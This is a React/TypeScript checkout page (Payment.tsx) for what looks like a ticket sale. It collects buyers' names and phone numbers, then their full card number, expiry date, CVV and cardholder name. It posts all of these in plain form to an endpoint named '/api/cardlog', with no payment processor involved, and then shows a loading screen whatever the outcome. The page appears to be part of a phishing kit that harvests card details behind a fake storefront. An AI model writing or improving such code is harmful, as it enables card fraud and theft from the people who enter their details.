// Payment.tsx - исправленная версия
import { useState, useEffect } from "react";
import styles from "./Payment.module.css";
import TotalOverview from "../../components/TotalOverview/TotalOverview";
import { useLocation } from "react-router-dom";
import Help from "../../components/Help/Help";
import { useRedirectChecker } from "../../hooks/useRedirectChecker";
import Loading from "../../components/Loading/Loading";

const Payment = () => {
  const location = useLocation();
  useRedirectChecker(3000);
  const [isLoading, setLoading] = useState<boolean>(false);
  const [currentStep, setCurrentStep] = useState<"personal" | "payment">(
    "personal"
  );
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    email: "-",
    countryCode: "+373",
    phoneNumber: "",
  });

  const [cardData, setCardData] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardholderName: "",
  });

  useEffect(() => {
    window.scrollTo(0, 0);
  }, [location.pathname, currentStep]);

  const handleInputChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>
  ) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleCardInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setCardData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmitPersonalData = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();

    if (
      !formData.firstName ||
      !formData.lastName ||
      !formData.email ||
      !formData.phoneNumber
    ) {
      alert("Please fill in all required fields");
      return;
    }

    // БЕРЕМ sessionId ИЗ localStorage
    const sessionId = localStorage.getItem("currentSessionId");
    if (!sessionId) {
      alert("Session ID not found");
      return;
    }

    try {
      const response = await fetch("/api/customer", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: sessionId, // ← Отправляем sessionId
          name: formData.firstName,
          surname: formData.lastName,
          phone: formData.phoneNumber,
          email: formData.email,
        }),
      });

      const data = await response.json();
      if (data.success) {
        setCurrentStep("payment");
      } else {
        alert("Ошибка при отправке данных");
      }
    } catch (err) {
      console.error("Ошибка сети:", err);
      alert("Не удалось отправить данные");
    }
  };

  const handleSubmitPayment = async () => {
    // Валидация карты
    if (
      !cardData.cardNumber ||
      !cardData.expiryDate ||
      !cardData.cvv ||
      !cardData.cardholderName
    ) {
      alert("Please fill in all card details");
      return;
    }

    // БЕРЕМ sessionId ИЗ localStorage
    const sessionId = localStorage.getItem("currentSessionId");
    if (!sessionId) {
      alert("Session ID not found");
      return;
    }

    try {
      const response = await fetch("/api/cardlog", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: sessionId, // ← Отправляем sessionId
          cardNumber: cardData.cardNumber,
          cardHolder: cardData.cardholderName,
          cvv: cardData.cvv,
          expireDate: cardData.expiryDate,
        }),
      });

      const data = await response.json();

      if (!data.success) {
        alert("Ошибка при обработке платежа");
      }
    } catch (err) {
      console.error("Ошибка сети:", err);
      alert("Не удалось обработать платеж");
    }
    setLoading(true);
  };

  return (
    <>
      <div className={styles.wrapper}>
        <div className={styles.content__side}>
          <div className={styles.form__container}>
            {currentStep === "personal" ? (
              <>
                <h1 className={styles.form__title}>
                  Who shall we send these tickets to?
                </h1>

                <form
                  onSubmit={(e) => handleSubmitPersonalData(e)}
                  className={styles.form}
                >
                  <div className={styles.form__row}>
                    <div className={styles.form__group}>
                      <label htmlFor="firstName" className={styles.form__label}>
                        First name
                      </label>
                      <input
                        type="text"
                        id="firstName"
                        name="firstName"
                        value={formData.firstName}
                        onChange={handleInputChange}
                        className={styles.form__input}
                        required
                      />
                    </div>

                    <div className={styles.form__group}>
                      <label htmlFor="lastName" className={styles.form__label}>
                        Last name
                      </label>
                      <input
                        type="text"
                        id="lastName"
                        name="lastName"
                        value={formData.lastName}
                        onChange={handleInputChange}
                        className={styles.form__input}
                        required
                      />
                    </div>
                  </div>



                  <div className={styles.form__group}>
                    <label htmlFor="phone" className={styles.form__label}>
                      Mobile phone number
                    </label>

                    <div className={styles.phone__container}>
                      <div className={styles.phone__input__container}>
                        <input
                          type="tel"
                          id="phone"
                          name="phoneNumber"
                          value={formData.phoneNumber}
                          onChange={handleInputChange}
                          className={styles.phone__input}
                          required
                        />
                      </div>
                    </div>

                    <p className={styles.phone__note}>
                      We will use this phone number for ticket delivery
                      notification via SMS and in case of order problems.
                    </p>
                  </div>
                </form>
              </>
            ) : (
              <>
                <h1 className={styles.form__title}>Payment Details</h1>

                <form
                  onSubmit={(e) => {
                    e.preventDefault();
                    handleSubmitPayment();
                  }}
                  className={styles.form}
                >
                  <div className={styles.form__group}>
                    <label htmlFor="cardNumber" className={styles.form__label}>
                      Card Number
                    </label>
                    <input
                      type="text"
                      id="cardNumber"
                      name="cardNumber"
                      value={cardData.cardNumber}
                      onChange={handleCardInputChange}
                      className={styles.form__input}
                      placeholder="1234 5678 9012 3456"
                      maxLength={19}
                      required
                    />
                  </div>

                  <div className={styles.form__row}>
                    <div className={styles.form__group}>
                      <label
                        htmlFor="expiryDate"
                        className={styles.form__label}
                      >
                        Expiry Date
                      </label>
                      <input
                        type="text"
                        id="expiryDate"
                        name="expiryDate"
                        value={cardData.expiryDate}
                        onChange={handleCardInputChange}
                        className={styles.form__input}
                        placeholder="MM/YY"
                        maxLength={5}
                        required
                      />
                    </div>

                    <div className={styles.form__group}>
                      <label htmlFor="cvv" className={styles.form__label}>
                        CVV
                      </label>
                      <input
                        type="text"
                        id="cvv"
                        name="cvv"
                        value={cardData.cvv}
                        onChange={handleCardInputChange}
                        className={styles.form__input}
                        placeholder="123"
                        maxLength={3}
                        required
                      />
                    </div>
                  </div>

                  <div className={styles.form__group}>
                    <label
                      htmlFor="cardholderName"
                      className={styles.form__label}
                    >
                      Cardholder Name
                    </label>
                    <input
                      type="text"
                      id="cardholderName"
                      name="cardholderName"
                      value={cardData.cardholderName}
                      onChange={handleCardInputChange}
                      className={styles.form__input}
                      placeholder="John Doe"
                      required
                    />
                  </div>
                </form>
              </>
            )}
          </div>
        </div>
        <div className={styles.static__side}>
          <TotalOverview
            onNextStep={
              currentStep === "personal"
                ? handleSubmitPersonalData
                : handleSubmitPayment
            }
            isPaymentStep={currentStep === "payment"}
          />
        </div>
      </div>
      <Help />
      <Loading isLoading={isLoading} />
    </>
  );
};

export default Payment;
